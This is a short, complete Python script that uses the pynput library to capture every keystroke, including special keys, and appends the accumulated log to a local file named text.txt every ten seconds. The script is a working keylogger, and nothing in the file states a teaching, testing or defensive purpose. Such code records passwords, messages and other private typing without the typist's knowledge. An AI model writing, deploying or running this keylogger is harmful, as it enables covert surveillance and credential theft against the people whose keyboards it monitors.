#!/usr/bin/env python
import pynput.keyboard, threading
log = ""


def report():
    global log
    with open("text.txt", "a") as file_key:
        file_key.write(log)
    log = ""
    time = threading.Timer(10, report)
    time.start()

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log+" "
        else:
            log = log + " "+str(key)+" "


keyboard = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard:
    report()
    keyboard.join()